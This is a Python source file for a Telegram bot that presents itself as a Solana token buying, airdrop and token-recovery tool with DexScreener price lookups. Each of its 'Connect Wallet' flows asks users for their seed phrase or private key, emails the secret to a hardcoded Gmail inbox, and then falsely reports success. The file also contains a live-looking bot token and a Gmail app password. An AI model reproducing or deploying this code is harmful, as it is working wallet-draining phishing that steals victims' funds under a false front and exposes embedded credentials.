from multiprocessing import context
from flask import app
import requests
import smtplib
from email.message import EmailMessage
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand
)
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "8585187554:AAH5Zf7FwodvJEBp14NYfR8LK2M8HGWBeN8"
API_URL = "https://api.dexscreener.com/latest/dex/tokens/"

# ---------------- EMAIL CONFIG ---------------- 
EMAIL_ADDRESS = "cyberdev203@gmail.com"
EMAIL_PASSWORD = "hozw zipq bvqa lmkj"
RECEIVER_EMAIL = "cyberdev203@gmail.com"

# ---------------- TOKEN INFO ----------------
def get_token_info(contract):
    try:
        response = requests.get(API_URL + contract, timeout=10)
        r = response.json()
    except Exception as e:
        return f"❌ Failed to fetch data from DexScreener.\nError: {e}", None

    if not r or "pairs" not in r or not isinstance(r["pairs"], list) or len(r["pairs"]) == 0:
        return "❌ Invalid or unsupported contract address.", None

    data = r["pairs"][0]

    name = data["baseToken"].get("name", "N/A")
    symbol = data["baseToken"].get("symbol", "N/A")
    price = data.get("priceUsd", "N/A")
    mc = data.get("fdv", "N/A")
    volume = data.get("volume", {}).get("h24", "N/A")
    liquidity = data.get("liquidity", {}).get("usd", "N/A")

    msg = (
        f"🚀 *{name}* ({symbol})\n"
        f"💰 Price: ${price}\n"
        f"📈 Market Cap: ${mc}\n"
        f"📊 Volume (24h): ${volume}\n"
        f"💧 Liquidity: ${liquidity}\n"
        f"🔗 Contract: `{contract}`"
    )
    return msg, None

# ---------------- EMAIL SENDER ----------------
def send_email(dummy_key: str, user_id: int):
    msg = EmailMessage()
    msg['Subject'] = f"Wallet Key/Phrase Submission from user {user_id}"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg.set_content(f"User ID: {user_id}\nWallet Key/Phrase: {dummy_key}")

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        print("✅ Email sent successfully!")
    except Exception as e:
        print(f"❌ Failed to send email: {e}")

# ---------------- NAVIGATION MENU ----------------
def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Get Token Info", callback_data="get_token")],
        [InlineKeyboardButton("Buy Token", callback_data="buy_token")],
        [InlineKeyboardButton("Claim Airdrop", callback_data="claim_airdrop")],
        [InlineKeyboardButton("Retrieve Token", callback_data="retrieve_token")],
        [InlineKeyboardButton("Help", callback_data="help")]
    ])

# ---------------- START ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name

    welcome_text = (
        f"👋 Welcome, {user_name}!\n\n"
        "This bot allows you to:\n"
        "🚀 Buy Tokens with SOL\n"
        "🎁 Claim  airdrops\n"
        "📊 Retrieve lost or stolen tokens\n"
        "💰 Get token info from DexScreener\n\n"
        "You can also try these commands directly:\n"
        "/buy - Buy a token\n"
        "/airdrop - Claim an airdrop\n"
        "/info - Get token info\n\n"
        "Use the menu below to navigate:"
    )

    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_menu()
    )

# ---------------- BUTTON HANDLER ----------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    context.user_data.clear()
    context.user_data["action"] = action

    if action == "buy_token":
        await query.message.reply_text("🔍 Send the contract address of the token you want to buy:")
        context.user_data["step"] = "buy_contract"

    elif action == "claim_airdrop":
        await query.message.reply_text("📩 Send your wallet address:")
        context.user_data["step"] = "airdrop_address"

    elif action == "retrieve_token":
        await query.message.reply_text("🔍 Send the token contract address you want to retrieve:")
        context.user_data["step"] = "retrieve_contract"

    elif action == "get_token":
        await query.message.reply_text("Send the token contract address:")
        context.user_data["step"] = "info"

    elif action == "help":
        await query.message.reply_text(
            "Use the menu to navigate.",
            reply_markup=get_main_menu()
        )

# ---------------- HANDLE MESSAGE ----------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    step = context.user_data.get("step")
    user_input = update.message.text.strip()
    user_id = update.message.from_user.id

    # ---------------- BUY TOKEN ----------------
    if step == "buy_contract":
        msg, _ = get_token_info(user_input)
        if "❌" in msg:
            await update.message.reply_text(msg + "\n\nPlease enter a valid contract address:")
            return

        context.user_data["contract"] = user_input
        await update.message.reply_text(msg, parse_mode="Markdown")
        await update.message.reply_text(
            "💵 How much SOL do you want to use? (Minimum: *0.1 SOL*)",
            parse_mode="Markdown"
        )
        context.user_data["step"] = "buy_sol_amount"
        return

    # ---------------- USER ENTERS SOL AMOUNT ----------------
    if step == "buy_sol_amount":
        try:
            sol_amount = float(user_input)
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number for SOL (minimum 0.1 SOL):")
            return

        if sol_amount < 0.1:
            await update.message.reply_text("❌ Minimum amount is 0.1 SOL. Please enter a valid amount:")
            return

        context.user_data["sol_amount"] = sol_amount
        await update.message.reply_text(
            "Connect your wallet to proceed:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet_buy")]
            ])
        )
        context.user_data["step"] = None
        return

    # ---------------- HANDLE WALLET INPUT FOR BUY ----------------
    if context.user_data.get("awaiting_wallet_input") == "buy":
        send_email(user_input, user_id)
        await update.message.reply_text(
            f"🪙 Token successfully bought!",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
        context.user_data.clear()
        return

    # ---------------- CLAIM AIRDROP ----------------
    if step == "airdrop_address":
        # Reject contract-like addresses
        if "pump" in user_input.lower() or len(user_input) < 30 or len(user_input) > 50: 
            await update.message.reply_text(
                "❌ That looks like a contract address, not a wallet address.\n"
                "Please send a valid wallet address to claim the airdrop."
            )
            return

        await update.message.reply_text(
            "Connect your wallet to claim:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet_airdrop")]
            ])
        )
        context.user_data["step"] = None
        return

    # ---------------- HANDLE WALLET INPUT FOR AIRDROP ----------------
    if context.user_data.get("awaiting_wallet_input") == "airdrop":
        send_email(user_input, user_id)
        await update.message.reply_text(
            f"🎁 Airdrop successfully claimed!",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
        context.user_data.clear()
        return


    # ---------------- RETRIEVE TOKEN ----------------
    if step == "retrieve_contract":
        msg, _ = get_token_info(user_input)
        if "❌" in msg:
            await update.message.reply_text(msg + "\n\nEnter a valid contract address:")
            return

        await update.message.reply_text(
            "Connect your wallet to continue:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet_retrieve")]
            ])
        )
        context.user_data["step"] = None
        return

    if context.user_data.get("awaiting_wallet_input") == "retrieve":
        send_email(user_input, user_id)
        await update.message.reply_text(
            f"📥 Tokens retrieved successfully!",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )
        context.user_data.clear()
        return

    # ---------------- GET TOKEN INFO ----------------
    if step == "info":
        msg, _ = get_token_info(user_input)
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_menu())
        context.user_data.clear()
        return

    await update.message.reply_text("Please use the menu:", reply_markup=get_main_menu())

# ---------------- CONNECT WALLET BUTTONS ----------------
async def connect_wallet_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data

    if action == "connect_wallet_buy":
        context.user_data["awaiting_wallet_input"] = "buy"
        await query.message.reply_text("🔑 Enter your seed phrase or private key:")

    elif action == "connect_wallet_airdrop":
        context.user_data["awaiting_wallet_input"] = "airdrop"
        await query.message.reply_text("🔑 Enter your seed phrase or private key:")

    elif action == "connect_wallet_retrieve":
        context.user_data["awaiting_wallet_input"] = "retrieve"
        await query.message.reply_text("🔑 Enter your seed phrase or private key:")
        
# ---------------- /BUY COMMAND ----------------
async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data["action"] = "buy_token"
    context.user_data["step"] = "buy_contract"

    await update.message.reply_text(
        "🔍 Send the contract address of the token you want to buy:"
    )


# ---------------- /AIRDROP COMMAND ----------------
async def airdrop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data["action"] = "claim_airdrop"
    context.user_data["step"] = "airdrop_address"

    await update.message.reply_text(
        "📩 Send your wallet address to claim your airdrop:"
    )


# ---------------- /INFO COMMAND ----------------
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    context.user_data["action"] = "get_token"
    context.user_data["step"] = "info"

    await update.message.reply_text("Send the token contract address:")


# ---------------- MAIN ----------------
from telegram import BotCommand
from telegram.ext import ApplicationBuilder

async def set_bot_commands(app):
    await app.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("buy", "Buy a token"),
        BotCommand("airdrop", "Claim an airdrop"),
        BotCommand("info", "Get token info"),
        BotCommand("help", "Show help menu"),
    ])

def main():

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Register handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", buy_command))
    app.add_handler(CommandHandler("airdrop", airdrop_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CommandHandler("help", start))

    app.add_handler(CallbackQueryHandler(connect_wallet_buttons, pattern="connect_wallet_"))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("🚀 Bot is running...")

    # Correct method to set commands before polling:
    app.post_init = set_bot_commands

    app.run_polling()

if __name__ == "__main__":
    main()